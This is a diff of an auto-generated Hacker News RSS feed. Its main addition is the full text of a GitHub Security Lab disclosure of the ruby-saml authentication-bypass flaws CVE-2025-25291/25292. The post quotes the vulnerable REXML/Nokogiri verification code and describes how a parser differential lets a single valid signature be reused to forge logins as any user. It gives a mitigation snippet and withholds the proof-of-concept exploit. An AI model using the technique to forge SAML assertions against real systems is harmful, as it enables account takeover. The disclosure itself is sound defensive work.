@@ -4,12 +4,243 @@
         <title>HN100 - Readable Contents</title>
         <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
         <description>Uses Readability to add bodies to the RSS feed</description>
-        <lastBuildDate>Sat, 15 Mar 2025 21:30:03 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 15 Mar 2025 22:30:12 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>https://github.com/jpmonette/feed</generator>
         <language>en</language>
         <item>
-            <title><![CDATA[Show HN: A personal YouTube frontend based on yt-dlp (144 pts)]]></title>
+            <title><![CDATA[Sign in as anyone: Bypassing SAML SSO authentication with parser differentials (117 pts)]]></title>
+            <link>https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/</link>
+            <guid>43374519</guid>
+            <pubDate>Sat, 15 Mar 2025 19:06:01 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/">https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/</a>, See on <a href="https://news.ycombinator.com/item?id=43374519">Hacker News</a></p>
+<div id="readability-page-1" class="page"><section>
+	
+<blockquote><p>Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.</p></blockquote>
+<p>In this blog post, we detail newly discovered authentication bypass vulnerabilities in the <a href="https://github.com/SAML-Toolkits/ruby-saml">ruby-saml</a> library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesn’t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.</p>
+<p>GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as <a href="https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.5-security-fixes">CVE-2024-9487</a>, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an <a href="https://github.com/advisories/GHSA-jw9c-mfg7-9rx2">authentication bypass</a> in ruby-saml (CVE-2024-45409) by <a href="https://hackerone.com/ahacker1">ahacker1</a>. With tangible evidence of exploitable attack surface, GitHub’s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a <a href="https://hackerone.com/github">private bug bounty engagement</a> to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.</p>
+<p>As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the <a href="https://hackerone.com/github">GitHub bug bounty program</a>, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support <a href="https://en.wikipedia.org/wiki/Canonical_XML">canonicalization</a> and potentially other things REXML didn’t support at that time.</p>
+<p>We both inspected the same code path in the <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268"><code>validate_signature</code></a> of <code>xml_security.rb</code> and found that the signature element to be verified is first read via REXML, and then also with Nokogiri’s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a <strong>parser differential</strong>!</p>
+<p>The reality was actually more complicated than this.</p>
+
+<p>Roughly speaking, four stages were involved in the discovery of this authentication bypass:</p>
+<ol>
+<li>Discovering that two different XML parsers are used during code review.  </li>
+<li>Establishing if and how a parser differential could be exploited.  </li>
+<li>Finding an actual parser differential for the parsers in use.  </li>
+<li>Leveraging the parser differential to create a full-blown exploit.</li>
+</ol>
+<p>To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.</p>
+<h2 id="quick-recap-how-saml-responses-are-validated">Quick recap: how SAML responses are validated<a href="#quick-recap-how-saml-responses-are-validated" aria-label="Quick recap: how SAML responses are validated"></a></h2>
+<p>Security assertion markup language (<a href="https://en.wikipedia.org/wiki/Security_Assertion_Markup_Language">SAML</a>) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.</p>
+<p>Let’s have a quick look at what a simplified SAML response looks like:<br>
+<img data-recalc-dims="1" decoding="async" loading="lazy" src="https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?resize=1024%2C355" alt="A diagram depicting a simplified SAML response on the left and the verification of the digest and the signature on the right." width="1024" height="355" srcset="https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2632 2632w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=1536 1536w, https://github.blog/wp-content/uploads/2025/03/goodassertion7_2.png?w=2048 2048w" sizes="auto, (max-width: 1000px) 100vw, 1000px"></p>
+<p><em>Note: in the response above the XML namespaces were removed for better readability.</em></p>
+<p>As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the <code>Subject</code> element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g. <code>NotBefore</code> and <code>NotOnOrAfter</code> dates as part of a <code>Conditions</code> element.)</p>
+<p>Normally, the <code>Assertion</code> (A) (without the whole <code>Signature</code> part) is <a href="https://en.wikipedia.org/wiki/Canonical_XML">canonicalized</a> and then compared against the <code>DigestValue</code> (C) and the <code>SignedInfo</code> (D) is canonicalized and verified against the <code>SignatureValue</code> (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.</p>
+<h2 id="searching-for-parser-differentials">Searching for parser differentials<a href="#searching-for-parser-differentials" aria-label="Searching for parser differentials"></a></h2>
+<p>We learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now let’s have a look at the verification of the signature and the digest comparison.<br>
+The focus of the following explanation lies on the <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268"><code>validate_signature</code></a> method inside of <code>xml_security.rb</code>.</p>
+<p>Inside that method, there’s a broad XPath <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L278C1-L282C8">query</a> with REXML for the first signature element inside the SAML document:</p>
+<pre><code>sig_element = REXML::XPath.first(
+  @working_copy,
+  "//ds:Signature",
+  {"ds"=&gt;DSIG}
+)
+</code></pre>
+<p><em>Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with <code>REXML::</code>, whereas Nokogiri methods are called on <code>document</code>.</em></p>
+<p>Later, the actual <code>SignatureValue</code> is <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L293C1-L298C92">read</a> from this element:</p>
+<pre><code>base64_signature = REXML::XPath.first(
+  sig_element,
+  "./ds:SignatureValue",
+  {"ds" =&gt; DSIG}
+)
+signature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))
+</code></pre>
+<p>Note: the name of the <code>Signature</code> element might be a bit confusing. While it contains the actual signature in the <code>SignatureValue</code> node it also contains the part that is actually signed in the <code>SignedInfo</code> node. Most importantly the <code>DigestValue</code> element contains the digest (hash) of the assertion and information about the used key.</p>
+<p>So, an actual <code>Signature</code> element could look like this (removed namespace information for better readability):</p>
+<pre><code>&lt;Signature&gt;
+    &lt;SignedInfo&gt;
+        &lt;CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /&gt;
+        &lt;SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" /&gt;
+        &lt;Reference URI="#_SAMEID"&gt;
+            &lt;Transforms&gt;&lt;Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /&gt;&lt;/Transforms&gt;
+            &lt;DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" /&gt;
+            &lt;DigestValue&gt;Su4v[..]&lt;/DigestValue&gt;
+        &lt;/Reference&gt;
+    &lt;/SignedInfo&gt;
+    &lt;SignatureValue&gt;L8/i[..]&lt;/SignatureValue&gt;
+    &lt;KeyInfo&gt;
+        &lt;X509Data&gt;
+            &lt;X509Certificate&gt;MIID[..]&lt;/X509Certificate&gt;
+        &lt;/X509Data&gt;
+    &lt;/KeyInfo&gt;
+&lt;/Signature&gt;
+</code></pre>
+<p>Later in the same method (<code>validate_signature</code>) there’s again a <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L307">query for the Signature</a>(s)—but this time with Nokogiri.</p>
+<pre><code>noko_sig_element = document.at_xpath('//ds:Signature', 'ds' =&gt; DSIG)
+</code></pre>
+<p>Then the <code>SignedInfo</code> element is taken from that signature and <a href="https://en.wikipedia.org/wiki/Canonical_XML">canonicalized</a>:</p>
+<pre><code>noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' =&gt; DSIG)
+
+canon_string = noko_signed_info_element.canonicalize(canon_algorithm)
+</code></pre>
+<p>Let’s remember this <code>canon_string</code> contains the canonicalized <code>SignedInfo</code> element.</p>
+<p>The <code>SignedInfo</code> element is then also <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L314C6-L318C8">extracted</a> with REXML:</p>
+<pre><code> signed_info_element = REXML::XPath.first(
+        sig_element,
+        "./ds:SignedInfo",
+        { "ds" =&gt; DSIG }
+ )
+</code></pre>
+<p>From this <code>SignedInfo</code> element the <code>Reference</code> node is <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L324">read</a>:</p>
+<pre><code>ref = REXML::XPath.first(signed_info_element, "./ds:Reference", {"ds"=&gt;DSIG})
+</code></pre>
+<p>Now the code <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L326C1-L327C1">queries for the referenced node</a> by looking for nodes with the signed element id using Nokogiri:</p>
+<pre><code>reference_nodes = document.xpath("//*[@ID=$id]", nil, { 'id' =&gt; extract_signed_element_id })
+</code></pre>
+<p>The method <code>extract_signed_element_id</code> <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L406C9-L406C34">extracts</a> the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), there’s now a <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L328">check</a> that only one element with the same ID can exist.</p>
+<p>The first of the <code>reference_nodes</code> is taken and canonicalized:</p>
+<pre><code>hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)
+</code></pre>
+<p>The <code>canon_hashed_element</code> is then <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L349C7-L349C59">hashed</a>:</p>
+<pre><code>hash = digest_algorithm.digest(canon_hashed_element)
+</code></pre>
+<p>The <code>DigestValue</code> to compare it against is then <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L350C7-L355C99">extracted</a> with REXML:</p>
+<pre><code>encoded_digest_value = REXML::XPath.first(
+        ref,
+        "./ds:DigestValue",
+        { "ds" =&gt; DSIG }
+      )
+digest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))
+</code></pre>
+<p>Finally, the <code>hash</code> (built from the element extracted by Nokogiri) is <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L357">compared</a> against the <code>digest_value</code> (extracted with REXML):</p>
+<pre><code>unless digests_match?(hash, digest_value)
+</code></pre>
+<p>The <code>canon_string</code> extracted some lines ago (a result of an extraction with Nokogiri) is later <a href="https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L366C7-L366C86">verified against</a> <code>signature</code> (extracted with REXML).</p>
+<pre><code>unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)
+</code></pre>
+<p>In the end, we have the following constellation:</p>
+<ol>
+<li>The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  </li>
+<li>The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.</li>
+</ol>
+<h2 id="exploiting-the-parser-differential">Exploiting the parser differential<a href="#exploiting-the-parser-differential" aria-label="Exploiting the parser differential"></a></h2>
+<p>The question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?</p>
+<p>It turns out, yes.</p>
+<p>Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the <a href="https://mattermost.com/blog/securing-xml-implementations-across-the-web/">XML roundtrips vulnerabilities</a> published by Mattermost’s Juho Forsén in 2021.</p>
+<p>Not much later, I produced an exploit using a different parser differential with the help of <a href="https://blog.trailofbits.com/2024/03/29/introducing-ruzzy-a-coverage-guided-ruby-fuzzer/">Trail of Bits’ Ruby fuzzer</a> called ruzzy.</p>
+<p>Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).</p>
+<p>An exploit could look like this. Here, an additional Signature was added as part of the <code>StatusDetail</code> element that is only visible to Nokogiri:</p>
+<p><img data-recalc-dims="1" decoding="async" loading="lazy" src="https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?resize=1024%2C400" alt="A diagram depicting a simplified SAML response on the left and the verification of the digest and the signature on the right. For both the signature and the digest verification one part is extracted using Nokogiri and the other using REXML." width="1024" height="400" srcset="https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=3496 3496w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=1536 1536w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=2048 2048w, https://github.blog/wp-content/uploads/2025/03/rubysaml-parser-diff-simplified8_2.png?w=3000 3000w" sizes="auto, (max-width: 1000px) 100vw, 1000px"></p>
+<p>In summary:</p>
+<p>The <code>SignedInfo</code> element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the <code>SignatureValue</code> (B) that was extracted from the signature seen by REXML.</p>
+<p>The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the <code>DigestValue</code> (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.</p>
+<p>So, two things take place:</p>
+<ul>
+<li>A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  </li>
+<li>A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)</li>
+</ul>
+<p>This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.</p>
+<h3 id="check-for-errors-when-using-nokogiri">Check for errors when using Nokogiri<a href="#check-for-errors-when-using-nokogiri" aria-label="Check for errors when using Nokogiri"></a></h3>
+<p>Parts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the <a href="https://www.rubydoc.info/github/sparklemotion/nokogiri/Nokogiri%2FXML%2FDocument:errors"><code>errors</code></a> member of the parsed document:</p>
+<pre><code>doc = Nokogiri::XML(xml) do |config|
+  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
+end
+
+raise "XML errors when parsing: " + doc.errors.to_s if doc.errors.any?
+</code></pre>
+<p>While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.</p>
+<h2 id="indicators-of-compromise">Indicators of compromise<a href="#indicators-of-compromise" aria-label="Indicators of compromise"></a></h2>
+<p>We are not aware of any reliable indicators of compromise. While we’ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so we’ve decided that it’s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the user’s expected location.</p>
+<h2 id="saml-and-xml-signaturesas-confusing-as-it-gets">SAML and XML signatures:as confusing as it gets<a href="#saml-and-xml-signaturesas-confusing-as-it-gets" aria-label="SAML and XML signatures:as confusing as it gets"></a></h2>
+<p>Some might say it’s hard to integrate systems with SAML. That might be true. However, it’s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: it’s probably best to <a href="https://ssoready.com/blog/engineering/ruby-saml-pwned-by-xml-signature-wrapping-attacks/#how-to-fix-this-disregard-the-spec">disregard the specifications</a>, as following them doesn’t help build secure implementations.<br>
+To rehash how the validation works if the SAML assertion is signed, let’s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?</p>
+<p><img data-recalc-dims="1" decoding="async" loading="lazy" src="https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?resize=1024%2C497" alt="A diagram showing a SAML response and its parts: the Assertion containing the Signature and the Signature containing the SignedInfo of which the DigestValue is a part." width="1024" height="497" srcset="https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?w=1768 1768w, https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?w=300 300w, https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?w=768 768w, https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?w=1024 1024w, https://github.blog/wp-content/uploads/2025/03/conclusion-combined-saml.png?w=1536 1536w" sizes="auto, (max-width: 1000px) 100vw, 1000px"></p>
+<p>To complicate it even more: What is even signed here? The whole assertion? No!</p>
+<p>What’s signed is the <code>SignedInfo</code> element and the <code>SignedInfo</code> element contains a <code>DigestValue</code>. This <code>DigestValue</code> is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different <code>SignedInfo</code> element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.</p>
+<p>In this case, the library already extracted the <code>SignedInfo</code> and used it to verify the signature of its canonicalized string,<code>canon_string</code>. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted <code>SignedInfo</code> to obtain the digest value, it would have been secure in this case even with two XML parsers in use.</p>
+<h2 id="conclusion">Conclusion<a href="#conclusion" aria-label="Conclusion"></a></h2>
+<p>As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.</p>
+<p>The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The <a href="https://github.com/SAML-Toolkits/ruby-saml/pull/736">removal of one of the XML</a> parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider <a href="https://github.com/sponsors">sponsoring</a> them to help fund their future development and bug fix releases.</p>
+<p>If you’re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for <a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-4vc4-m8qh-g8jm">CVE-2025-25291</a> and <a href="https://github.com/SAML-Toolkits/ruby-saml/security/advisories/GHSA-754f-8gm6-c4r2">CVE-2025-25292</a>. References to libraries making use of ruby-saml (such as <a href="https://github.com/omniauth/omniauth-saml">omniauth-saml</a>) need also be updated to a version that reference a fixed version of ruby-saml. We will publish a proof of concept exploit at a later date in the <a href="https://github.com/github/securitylab">GitHub Security Lab repository</a>.</p>
+<h3 id="acknowledgments">Acknowledgments<a href="#acknowledgments" aria-label="Acknowledgments"></a></h3>
+<p>Special thanks to Sixto Martín, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.<br>
+Special thanks also to ahacker1 for giving inputs to this blog post.</p>
+<h3 id="timeline">Timeline<a href="#timeline" aria-label="Timeline"></a></h3>
+<ul>
+<li>2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  </li>
+<li>2024-11-04: Work started to identify and test potential mitigations.  </li>
+<li>2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  </li>
+<li>2024-11-13: Initial contact with Sixto Martín, maintainer of ruby-saml.  </li>
+<li>2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  </li>
+<li>2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  </li>
+<li>2025-02-04: ahacker1 proposes a non-backwards compatible fix.  </li>
+<li>2025-02-06: ahacker1 also proposes a backwards compatible fix.  </li>
+<li>2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  </li>
+<li>2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  </li>
+<li>2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  </li>
+<li>2025-03-12: A fixed version of ruby-saml was released.</li>
+</ul>
+
+	
+<section>
+	<hr>
+	<div>
+		<h2>Tags:</h2>
+		<ul>
+							<li>
+					<a href="https://github.blog/tag/authentication/" rel="tag">
+						authentication					</a>
+				</li>
+							<li>
+					<a href="https://github.blog/tag/github-security-lab/" rel="tag">
+						GitHub Security Lab					</a>
+				</li>
+							<li>
+					<a href="https://github.blog/tag/ruby/" rel="tag">
+						ruby					</a>
+				</li>
+							<li>
+					<a href="https://github.blog/tag/saml/" rel="tag">
+						SAML					</a>
+				</li>
+							<li>
+					<a href="https://github.blog/tag/vulnerability/" rel="tag">
+						vulnerability					</a>
+				</li>
+					</ul>
+	</div>
+</section>
+	<div>
+	<h2>
+		Written by	</h2>
+	
+			<article>
+	<div>
+					<div>
+				<picture>
+					<source srcset="https://avatars.githubusercontent.com/u/176818?v=4&amp;s=200" width="120" height="120" media="(min-width: 768px)">
+					<img src="https://avatars.githubusercontent.com/u/176818?v=4&amp;s=200" alt="Peter Stöckli" width="80" height="80" loading="lazy" decoding="async">
+				</picture>
+			</div>
+				
+					<p>Security Researcher at GitHub Security Lab</p>
+			</div>
+</article>
+	</div>
+</section></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[How many artists' careers did the Beatles kill? (118 pts)]]></title>
+            <link>https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles</link>
+            <guid>43373765</guid>
+            <pubDate>Sat, 15 Mar 2025 17:05:07 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles">https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles</a>, See on <a href="https://news.ycombinator.com/item?id=43373765">Hacker News</a></p>
+Couldn't get https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles: Error: timeout of 10000ms exceeded]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Show HN: A personal YouTube frontend based on yt-dlp (160 pts)]]></title>
             <link>https://github.com/christian-fei/my-yt</link>
             <guid>43373242</guid>
             <pubDate>Sat, 15 Mar 2025 15:45:42 GMT</pubDate>
@@ -97,7 +328,7 @@ docker compose up --build -d</pre></div>
 </article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Milk Kanban (241 pts)]]></title>
+            <title><![CDATA[Milk Kanban (261 pts)]]></title>
             <link>https://brodzinski.com/2025/03/milk-kanban.html</link>
             <guid>43373157</guid>
             <pubDate>Sat, 15 Mar 2025 15:32:02 GMT</pubDate>
@@ -218,7 +449,7 @@ docker compose up --build -d</pre></div>
 				</div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Arbitrary-Scale Super-Resolution with Neural Heat Fields (118 pts)]]></title>
+            <title><![CDATA[Arbitrary-Scale Super-Resolution with Neural Heat Fields (125 pts)]]></title>
             <link>https://therasr.github.io/</link>
             <guid>43371583</guid>
             <pubDate>Sat, 15 Mar 2025 10:39:31 GMT</pubDate>
@@ -226,7 +457,7 @@ docker compose up --build -d</pre></div>
 Couldn't get https://therasr.github.io/: Error: timeout of 10000ms exceeded]]></description>
         </item>
         <item>
-            <title><![CDATA[Finland's National Allergy Program Successfully Reduces Allergic Diseases (176 pts)]]></title>
+            <title><![CDATA[Finland's National Allergy Program Successfully Reduces Allergic Diseases (177 pts)]]></title>
             <link>https://publications.ersnet.org/content/erj/49/6/1700470</link>
             <guid>43370956</guid>
             <pubDate>Sat, 15 Mar 2025 08:23:12 GMT</pubDate>
@@ -234,7 +465,7 @@ Couldn't get https://therasr.github.io/: Error: timeout of 10000ms exceeded]]></
 Couldn't get https://publications.ersnet.org/content/erj/49/6/1700470: Error [ERR_FR_TOO_MANY_REDIRECTS]: Maximum number of redirects exceeded]]></description>
         </item>
         <item>
-            <title><![CDATA[Transformers Without Normalization (217 pts)]]></title>
+            <title><![CDATA[Transformers Without Normalization (222 pts)]]></title>
             <link>https://jiachenzhu.github.io/DyT/</link>
             <guid>43369633</guid>
             <pubDate>Sat, 15 Mar 2025 03:12:39 GMT</pubDate>
@@ -370,7 +601,7 @@ Couldn't get https://publications.ersnet.org/content/erj/49/6/1700470: Error [ER
     </section></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Google Being Forced to Sell Chrome Is Not Good for the Web (181 pts)]]></title>
+            <title><![CDATA[Google Being Forced to Sell Chrome Is Not Good for the Web (185 pts)]]></title>
             <link>https://chriscoyier.net/2025/03/14/google-being-forced-to-sell-chrome-is-not-good-for-the-web/</link>
             <guid>43369230</guid>
             <pubDate>Sat, 15 Mar 2025 01:57:59 GMT</pubDate>
@@ -582,127 +813,12 @@ aws-actions/amazon-ecr-login@*,</code></pre></li><li><p>Remove tj-actions/change
 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[New York Times shut down Tor Onion service (237 pts)]]></title>
+            <title><![CDATA[New York Times shut down Tor Onion service (238 pts)]]></title>
             <link>https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482</link>
             <guid>43368183</guid>
             <pubDate>Fri, 14 Mar 2025 22:53:58 GMT</pubDate>
             <description><![CDATA[<p>URL: <a href="https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482">https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482</a>, See on <a href="https://news.ycombinator.com/item?id=43368183">Hacker News</a></p>
 Couldn't get https://open.nytimes.com/https-open-nytimes-com-the-new-york-times-as-a-tor-onion-service-e0d0b67b7482: Error: Request failed with status code 403]]></description>
-        </item>
-        <item>
-            <title><![CDATA[Tj-actions/changed-files GitHub Action Compromised – used by over 23K repos (188 pts)]]></title>
-            <link>https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</link>
-            <guid>43367987</guid>
-            <pubDate>Fri, 14 Mar 2025 22:29:46 GMT</pubDate>
-            <description><![CDATA[<p>URL: <a href="https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised">https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised</a>, See on <a href="https://news.ycombinator.com/item?id=43367987">Hacker News</a></p>
